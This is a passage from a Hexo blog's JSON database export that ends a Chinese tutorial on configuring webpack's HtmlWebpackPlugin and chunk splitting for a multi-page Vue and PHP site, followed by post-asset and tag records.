插件用的模板文件</span></span><br><span class=\"line\">        template: <span class=\"string\">`<span class=\"subst\">$&#123;ROOT&#125;</span>/<span class=\"subst\">$&#123;config.$d&#125;</span>/js/page/<span class=\"subst\">$&#123;name&#125;</span>/<span class=\"subst\">$&#123;mapping[name].viewFile || <span class=\"string\">'index'</span>&#125;</span>.<span class=\"subst\">$&#123;mapping[name].templateType || <span class=\"string\">'html'</span>&#125;</span>`</span>,</span><br><span class=\"line\">        chunks: ( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( !rename ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//let chunks = [ 'vendor.npm', 'vendor.TP', 'manifest', 'vendor.modules' ];</span></span><br><span class=\"line\">            <span class=\"keyword\">let</span> chunks = [ <span class=\"string\">'vendor.modules'</span>, <span class=\"string\">'vendor'</span>, <span class=\"string\">'manifest'</span> ];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( mapping[ name ].chunks ) &#123;</span><br><span class=\"line\">              chunks = chunks.concat( mapping[ name ].chunks );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> chunks;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> [];</span><br><span class=\"line\">        &#125;() ).concat( [ <span class=\"string\">`<span class=\"subst\">$&#123;rename ? config.dev.entryPrefix : <span class=\"string\">''</span>&#125;</span><span class=\"subst\">$&#123;name&#125;</span>`</span> ] ),</span><br><span class=\"line\">        <span class=\"comment\">// 手工排序</span></span><br><span class=\"line\">        chunksSortMode: <span class=\"string\">'manual'</span>,</span><br><span class=\"line\">        inject: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        showErrors: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125; ) );</span><br><span class=\"line\">  &#125; );</span><br><span class=\"line\">  <span class=\"keyword\">return</span> HtmlWebpackPlugins;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>alwaysWriteToDisk</code>这个字段是我们能前后端结合开发的关键，没有使用后端模板的项目真的做到前后分离时是不需要这个字段的，因为PHP会读这个文件再渲染数据出来给浏览器</p>\n<h4>webpack.base.cfg.js、webpack.dev.cfg.js</h4>\n<p>都是些老生常谈的配置，这里就不赘述了。值得注意的是<code>dev.client.js</code>这个文件被我删了，因为使用了<code>alwaysWriteToDisk</code>实时写入的功能，改变css文件和js文件都会强制刷新，那热更新完全就没法用了，所以html文件的变化还是需要手动刷新的</p>\n<h4>webpack.prod.cfg.js</h4>\n<p><code>HtmlWebpackPlugin</code>这个插件确实是有多少页面就要插入多少个实例进去的，所以直接</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...utils.getHtmlWebpackPlugins( <span class=\"literal\">false</span> ),</span><br></pre></td></tr></table></figure>\n<p>展开这个数组就好了，这里传入的布尔参数是为了区分开发模式和build模式，传入<code>true</code>只会有一个chunk被包含进来，就是当前页面依赖的所有js和css等<br>\n然后是<code>chunks</code></p>\n<h5>manifest</h5>\n<p>有的页面因为太简单并没有依赖太多共用的js，但是依赖了共用的css，所以这个chunk仅仅是为了抽取css文件用，造成引用了一个空的js，暂时没有想到好的解决办法，欢迎再issues提出改进建议</p>\n<h5>vendor.modules</h5>\n<p>这个chunk是为了抽取我们自己写的业务组件、在修改业务组件后能够很好的利用缓存只更新这一个文件</p>\n<h5>commonChunk</h5>\n<p>上文<code>mapping</code>里的chunks字段就是这里配置的，如果还有其他局部共用的大chunk可以在这里再配置一个</p>\n<h5>vendor</h5>\n<p>vendor就是拿来放置第三方插件的，这里抽取了npm和lib里面的，当项目稳定后处于一个稳定的维护期，没有较大改动时，这个文件就可以长期缓存在用户的电脑里了。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> CopyWebpackPlugin( [ &#123;</span><br><span class=\"line\">  <span class=\"keyword\">from</span>: path.resolve( __dirname, <span class=\"string\">`../<span class=\"subst\">$&#123;config.$d&#125;</span>/images`</span> ),</span><br><span class=\"line\">  to: <span class=\"string\">`<span class=\"subst\">$&#123;config.build.assetsSubDirectory&#125;</span>/images`</span>,</span><br><span class=\"line\">  ignore: [ <span class=\"string\">'.*'</span> ]</span><br><span class=\"line\">&#125; ] ),</span><br></pre></td></tr></table></figure>\n<p>上面的代码就是拷贝images这个目录到我们打包生成的目录里，防止资源丢失的问题</p>\n<hr>\n<p>这个脚手架很可能无法直接运行在你的项目里，但是能为你的多页入口的<code>website</code>提供一个很好的引入<code>webpack</code>的思路</p>\n<p>嗯，留下仓库<a href=\"https://github.com/Ryuurock/vue-muilt-page-config\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<p>have fun ~~</p>\n"}],"PostAsset":[{"_id":"source/_posts/cross-domain/20170627224652.jpg","post":"cje9esjvl000ci4ucf88z5496","slug":"20170627224652.jpg","modified":1,"renderable":1},{"_id":"source/_posts/css-areo/20171004172449.jpg","post":"cje9esjw1000qi4uc84r8jgtc","slug":"20171004172449.jpg","modified":1,"renderable":1},{"_id":"source/_posts/puppeteer/QQ20180109-225305.png","post":"cje9esjw1000ri4ucm16wtrql","slug":"QQ20180109-225305.png","modified":1,"renderable":1},{"_id":"source/_posts/new-front-end/webpack.png","post":"cje9esjw1000ui4uch0u3dfga","slug":"webpack.png","modified":1,"renderable":1},{"_id":"source/_posts/recursion-function/20171124140432.jpg","post":"cje9esjw1000wi4ucr7apk4ml","slug":"20171124140432.jpg","modified":1,"renderable":1},{"_id":"source/_posts/jQuery-pulgin-retract/result.jpg","post":"cje9esjw1000ji4ucl4sqvwbn","slug":"result.jpg","modified":1,"renderable":1},{"_id":"source/_posts/jQuery-pulgin-retract/result2.jpg","post":"cje9esjw1000ji4ucl4sqvwbn","slug":"result2.jpg","modified":1,"renderable":1},{"_id":"source/_posts/jQuery-pulgin-retract/result3.jpg","post":"cje9esjw1000ji4ucl4sqvwbn","slug":"result3.jpg","modified":1,"renderable":1},{"_id":"source/_posts/jQuery-pulgin-retract/result4.jpg","post":"cje9esjw1000ji4ucl4sqvwbn","slug":"result4.jpg","modified":1,"renderable":1},{"_id":"source/_posts/front-end-focus/1021884518-59bc9e30d414a_articlex.png","post":"cje9esjvl0009i4ucg7prajbg","slug":"1021884518-59bc9e30d414a_articlex.png","modified":1,"renderable":1},{"_id":"source/_posts/front-end-focus/20180228144215.jpg","post":"cje9esjvl0009i4ucg7prajbg","slug":"20180228144215.jpg","modified":1,"renderable":1},{"_id":"source/_posts/front-end-focus/4020255170-59bc9e1671029_articlex.png","post":"cje9esjvl0009i4ucg7prajbg","slug":"4020255170-59bc9e1671029_articlex.png","modified":1,"renderable":1},{"_id":"source/_posts/front-end-focus/640.webp","post":"cje9esjvl0009i4ucg7prajbg","slug":"640.webp","modified":1,"renderable":1},{"_id":"source/_posts/front-end-focus/641.webp","post":"cje9esjvl0009i4ucg7prajbg","slug":"641.webp","modified":1,"renderable":1},{"_id":"source/_posts/front-end-focus/meta-viewport-usage-1.jpg","post":"cje9esjvl0009i4ucg7prajbg","slug":"meta-viewport-usage-1.jpg","modified":1,"renderable":1},{"_id":"source/_posts/front-end-focus/meta-viewport-usage-2.jpg","post":"cje9esjvl0009i4ucg7prajbg","slug":"meta-viewport-usage-2.jpg","modified":1,"renderable":1}],"PostCategory":[],"PostTag":[{"post_id":"cje9esjv50001i4ucv2kase7o","tag_id":"cje9esjv50003i4uc70e7hm8a","_id":"cje9esjw1000fi4ucxyzjzxrg"},{"post_id":"cje9esjv50001i4ucv2kase7o","tag_id":"cje9esjvl0007i4uc1ufvwb3w","_id":"cje9esjw1000hi4uc9t8smvuy"},{"post_id":"cje9esjv50001i4ucv2kase7o","tag_id":"cje9esjvl000ai4ucvrogdlvd","_id":"cje9esjw1000ki4ucgor4d19z"},{"post_id":"cje9esjv50002i4ucmqdoxzyo","tag_id":"cje9esjvl000di4uc8468tkpd","_id":"cje9esjw1000mi4ucxzbltiye"},{"post_id":"cje9esjv50004i4uc36jz82jf","tag_id":"cje9esjw1000ii4ucbp6vnzmy","_id":"cje9esjw1000pi4ucm2dsj2nb"},{"post_id":"cje9esjvl0005i4uc3fys1x78","tag_id":"cje9esjw1000oi4uc9i1x87yr","_id":"cje9esjw1000xi4ucw2nfjaiz"},{"post_id":"cje9esjvl0005i4uc3fys1x78","tag_id":"cje9esjw1000si4uc7xdpw6f4","_id":"cje9esjwg000zi4ucnrtqrdtx"},{"post_id":"cje9esjvl0006i4uc86jyn9sw","tag_id":"cje9esjw1000vi4ucw2xz7pk7","_id":"cje9esjwg0012i4uc954yas1j"},{"post_id":"cje9esjvl0006i4uc86jyn9sw","tag_id":"cje9esjwg0010i4ucpk3ouokv","_id":"cje9esjwg0013i4uci9hcv070"},{"post_id":"cje9esjvl0008i4uc6o76pynx","tag_id":"cje9esjwg0011i4uceo7msumh","_id":"cje9esjwg0017i4uc6f5nr13b"},{"post_id":"cje9esjvl0008i4uc6o76pynx","tag_id":"cje9esjwg0014i4ucvab31fzu","_id":"cje9esjwg0018i4ucw59lp8ft"},{"post_id":"cje9esjvl0008i4uc6o76pynx","tag_id":"cje9esjwg0015i4uc3j0vtcz6","_id":"cje9esjwg001ai4uczrgmmr9p"},{"post_id":"cje9esjvl0009i4ucg7prajbg","tag_id":"cje9esjwg0016i4uc2d36iufa","_id":"cje9esjwg001bi4ucrjcfxid9"},{"post_id":"cje9esjvl000bi4ucjpgru1dk","tag_id":"cje9esjwg0019i4uclwejk8em","_id":"cje9esjwg001ei4ucaqb5w9zn"},{"post_id":"cje9esjvl000bi4ucjpgru1dk","tag_id":"cje9esjwg001ci4ucs1dwe0a6","_id":"cje9esjwg001fi4ucso3ssmj4"},{"post_id":"cje9esjvl000ci4ucf88z5496","tag_id":"cje9esjwg0016i4uc2d36iufa","_id":"cje9esjwg001ii4ucbgifbnnu"},{"post_id":"cje9esjvl000ci4ucf88z5496","tag_id":"cje9esjwg001gi4uc7wx03mi5","_id":"cje9esjwg001ji4uche9z5g2r"},{"post_id":"cje9esjvl000ei4ucaln5wuqy","tag_id":"cje9esjwg001hi4ucqszbd71h","_id":"cje9esjwg001li4ucw7h20n6r"},{"post_id":"cje9esjw1000gi4ucsshhtsd8","tag_id":"cje9esjwg001ki4uclfy9lsyv","_id":"cje9esjwg001oi4ucy8g4mk9f"},{"post_id":"cje9esjw1000gi4ucsshhtsd8","tag_id":"cje9esjwg001mi4ucuk1fuviu","_id":"cje9esjwg001pi4uc2moxkj5q"},{"post_id":"cje9esjw1000ji4ucl4sqvwbn","tag_id":"cje9esjwg001ni4uc8089s6l0","_id":"cje9esjwg001si4uce1xmfi3j"},{"post_id":"cje9esjw1000ji4ucl4sqvwbn","tag_id":"cje9esjwg0016i4uc2d36iufa","_id":"cje9esjwg001ti4ucj0shxeq3"},{"post_id":"cje9esjw1000li4ucvmyc3yb8","tag_id":"cje9esjwg001ri4uccpdpuv2o","_id":"cje9esjwg001wi4ucbvxp02wc"},{"post_id":"cje9esjw1000li4ucvmyc3yb8","tag_id":"cje9esjwg0016i4uc2d36iufa","_id":"cje9esjwg001xi4uckhfyfeef"},{"post_id":"cje9esjw1000ni4ucxkyuma9z","tag_id":"cje9esjwg001vi4ucje9vf02q","_id":"cje9esjww0020i4uck34f8qd4"},{"post_id":"cje9esjw1000ni4ucxkyuma9z","tag_id":"cje9esjwg001mi4ucuk1fuviu","_id":"cje9esjww0021i4ucyyzyssv0"},{"post_id":"cje9esjw1000qi4uc84r8jgtc","tag_id":"cje9esjwg001zi4ucrjoev7dg","_id":"cje9esjww0024i4ucpt78nvgt"},{"post_id":"cje9esjw1000qi4uc84r8jgtc","tag_id":"cje9esjww0022i4uclw868pdk","_id":"cje9esjww0025i4ucmh66y8ax"},{"post_id":"cje9esjw1000ri4ucm16wtrql","tag_id":"cje9esjwg0011i4uceo7msumh","_id":"cje9esjww0028i4ucu0gbrtax"},{"post_id":"cje9esjw1000ri4ucm16wtrql","tag_id":"cje9esjwg001mi4ucuk1fuviu","_id":"cje9esjww0029i4ucq7tdeijc"},{"post_id":"cje9esjw1000ti4uc5bjpk38z","tag_id":"cje9esjwg001vi4ucje9vf02q","_id":"cje9esjww002ci4ucyq3mkilt"},{"post_id":"cje9esjw1000ti4uc5bjpk38z","tag_id":"cje9esjww002ai4uc3nhf8ku9","_id":"cje9esjww002di4uc70jhhw27"},{"post_id":"cje9esjw1000ui4uch0u3dfga","tag_id":"cje9esjwg0016i4uc2d36iufa","_id":"cje9esjww002hi4uc2ywr2gml"},{"post_id":"cje9esjw1000ui4uch0u3dfga","tag_id":"cje9esjwg001ki4uclfy9lsyv","_id":"cje9esjww002ii4ucs7o91hxh"},{"post_id":"cje9esjw1000ui4uch0u3dfga","tag_id":"cje9esjww002fi4ucl65eh15l","_id":"cje9esjww002ki4uce5yhjmy9"},{"post_id":"cje9esjw1000wi4ucr7apk4ml","tag_id":"cje9esjww002gi4ucenh677fs","_id":"cje9esjww002li4uc05dsvfk6"},{"post_id":"cje9esjwg000yi4ucy5u32reh","tag_id":"cje9esjww002ji4ucn3h6aaew","_id":"cje9esjww002ni4ucnyldn276"},{"post_id":"cje9esjwg000yi4ucy5u32reh","tag_id":"cje9esjwg001ki4uclfy9lsyv","_id":"cje9esjww002oi4uc07q7727k"}],"Tag":[{"name":"订阅者模式","_id":"cje9esjv50003i4uc70e7hm8a"},{"name":"Observer","_id":"cje9esjvl0007i4uc1ufvwb3w"},{"name":"设计模式","_id":"cje9esjvl000ai4ucvrogdlvd"},{"name":"ES5","_id":"cje9esjvl000di4uc8468tkpd"},{"name":"chrome extention","_id":"cje9esjw1000ii4ucbp6vnzmy"},{"name":"装饰器","_id":"cje9esjw1000oi4uc9i1x87yr"},{"name":"Decorator","_id":"cje9esjw1000si4uc7xdpw6f4"},{"name":"Promise","_id":"cje9esjw1000vi4ucw2xz7pk7"},{"name":"async await","_id":"cje9esjwg0010i4ucpk3ouokv"},{"name":"headless","_id":"cje9esjwg0011i4uceo7msumh"},{"name":"chrome","_id":"cje9esjwg0014i4ucvab31fzu"},{"name":"puppeteer","_id":"cje9esjwg0015i4uc3j0vtcz6"},{"name":"javascript","_id":"cje9esjwg0016i4uc2d36iufa"},{"name":"jquery","_id":"cje9esjwg0019i4uclwejk8em"},{"name":"ajax","_id":"cje9esjwg001ci4ucs1dwe0a6"},{"name":"跨域","_id":"cje9esjwg001gi4uc7wx03mi5"},{"name":"gulp","_id":"cje9esjwg001hi4ucqszbd71h"},{"name":"webpack","_id":"cje9esjwg001ki4uclfy9lsyv"},{"name":"nodejs","_id":"cje9esjwg001mi4ucuk1fuviu"},{"name":"jQuery plugin","_id":"cje9esjwg001ni4uc8089s6l0"},{"name":"事件","_id":"cje9esjwg001ri4uccpdpuv2o"},{"name":"websocket","_id":"cje9esjwg001vi4ucje9vf02q"},{"name":"css","_id":"cje9esjwg001zi4ucrjoev7dg"},{"name":"areo","_id":"cje9esjww0022i4uclw868pdk"},{"name":"并发","_id":"cje9esjww002ai4uc3nhf8ku9"},{"name":"AMD CMD","_id":"cje9esjww002fi4ucl65eh15l"},{"name":"recursion","_id":"cje9esjww002gi4ucenh677fs"},{"name":"vuejs","_id":"cje9esjww002ji4ucn3h6aaew"}]}}